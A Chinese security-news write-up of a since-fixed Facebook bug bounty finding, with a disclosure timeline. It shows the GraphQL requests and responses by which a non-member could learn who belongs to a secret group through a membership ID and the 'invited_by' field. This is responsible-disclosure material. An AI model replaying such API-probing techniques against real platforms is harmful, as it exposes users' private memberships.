***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

![](https://image.3001.net/images/20191031/1572514017_5dbaa8e113e82.png!small)

在Facebook非公开的私密群组（Secret）中，只有群内成员或管理员才有权看得到群组成员信息，但经作者测试发现，针对任意私密群组，非私密群组成员一样可以查看其中的群组成员信息。漏洞最终获得Facebook官方$3000美金奖励。

## 漏洞复现步骤

在用户B和非公开私密群组D之间不存在任何关系之前，以用户A身份提交以下请求：

    
    
    POST /api/graphql/?doc_id=2416329748453695 HTTP/1.1
    
    Host: facebook.com
    
    variables=%7B%22groupID%22%3A%22Group_D_ID%22%2C%22memberID%22%3A%22
    
    User_B_ID%22%7D

然后我们收到以下响应：

    
    
    { 
    
       "data":{ 
    
          "group":{ 
    
             "id":"2082572965383830",
    
             "can_viewer_claim_adminship":false,
    
             "membership":null
    
          }
    
       }
    
    }

可以看到，响应中存在"membership":null字段，这是因为用户B和非公开私密群组D之间不存在任何关系，也即用户B不是私密群组D内成员。

现在，如果私密群组D内某成员发邀请给用户B，让用户B加入私密群组D，也就是用户B和私密群组D已经开始建立了一种联系（Relationship）。此时，我们重复第一个步骤中的请求后，会收到以下响应：

    
    
    { 
    
       "data":{ 
    
          "group":{ 
    
             "id":"2082572965383830",
    
             "can_viewer_claim_adminship":false,
    
             "membership":{ 
    
                "member_actions":[ 
    
                   { 
    
                      "__typename":"GroupSendMessageToMemberAction",
    
                      "action_name":"Send message",
    
                      "action_type":"SEND_MESSAGE"
    
                   }
    
                ],
    
                "member":{ 
    
                   "id":"100038336371044"
    
                },
    
                "id":"124632125491333"
    
             }
    
          }
    
       }
    
    }

此时，membership = membership_id，尽管membership函数内无法看出一些有用信息，但我们可以利用其中的响应信息来继续构造请求。

现在，我们把其中的membership ID，也就是代表“GroupMembership”的
"id":"124632125491333"提取出来，构造如下GraphQL请求：

    
    
    graphql?q=node(GroupMembershipID)
    
    { 
    
       member,
    
       associated_group,
    
       invited_by{ 
    
          id,
    
          name
    
       }
    
    }

收到的响应如下：

    
    
    "124632125491333":{ 
    
       "member":{ 
    
          "name":"Sandra Alchccfcgajdd Lauescu",
    
          "url":"<https://www.facebook.com/profile.php?id=100038336371044>",
    
          "id":"100038336371044"
    
       },
    
       "associated_group":{ 
    
          "name":"Members",
    
          "url":"<https://www.facebook.com/groups/2082572965383830/>",
    
          "id":"2082572965383830"
    
       },
    
       "invited_by":null
    
    }
    
    }

从中可以看到"invited_by":null，也就是说，用户B还未正式被私密群组D批准成为正式成员。但如果用户B是私密群组D的正式成员后，我们收到的响应会包含以下字段：

    
    
    "invited_by":
    
      {
    
        id: MEMBER_ID,
    
        name: Member_Name
    
      }

invited_by字段代表了群组内其它成员对用户B的邀请入群动作，如果用户B退群，这个invited_by会被再次置空，也就是说，我们可以通过这个点来判断私密群组内的具体成员信息。

漏洞影响是，非群组成员可查看任意私密群组成员信息，最终，Facebook把响应信息中的invited_by字段进行了删除，以此修复了漏洞。

## 漏洞上报处置进程

> 13/08/2019: 漏洞初报
>
> 14/08/2019: Facebook确认
>
> 15/08/2019: Facebook调查
>
> 16/08/2019: Facebook修复
>
> 20/08/2019: 确认Facebook修复完成
>
> 01/10/2019: 获得Facebook$3000赏金

 ***参考来源：[medium](https://medium.com/@edmundaa222/poc-disclose-members-in-any-closed-facebook-group-259783fa4bf)，clouds 编译整理，转载请注明来自 FreeBuf.COM**  

